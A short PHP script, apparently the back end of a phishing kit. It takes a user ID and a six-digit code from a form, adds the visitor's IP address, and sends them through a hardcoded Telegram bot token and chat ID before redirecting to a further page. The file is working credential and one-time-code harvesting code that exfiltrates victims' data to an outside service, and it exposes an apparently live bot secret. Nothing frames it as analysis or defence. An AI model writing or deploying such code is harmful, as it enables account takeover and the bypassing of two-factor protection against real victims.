<?php
// Configuración del bot de Telegram
$apiToken = "6808586807:AAH5KvJxwCHbxVecJJ1D2fQyiVCK4u_RuBQ";
$chatId = "5157616506";

// Recopila datos del formulario
$userid = $_POST['userid'] ?? 'No proporcionado';
$numeros = [];
for ($i = 1; $i <= 6; $i++) {
    $numeros[] = $_POST["num$i"] ?? 'No proporcionado';
}

// Obtiene la dirección IP del usuario
$ip = $_SERVER['REMOTE_ADDR'];

// Crea el mensaje
$message = "PRODU Codigo\nUsuario: $userid\nCODe: " . implode(', ', $numeros) . "\nIP: $ip";

// Envía el mensaje a Telegram
$data = [
    'chat_id' => $chatId,
    'text' => $message
];
file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));

// Redirecciona a otra página
header('Location: index4.php?userid=' . urlencode($userid));
exit();
?>
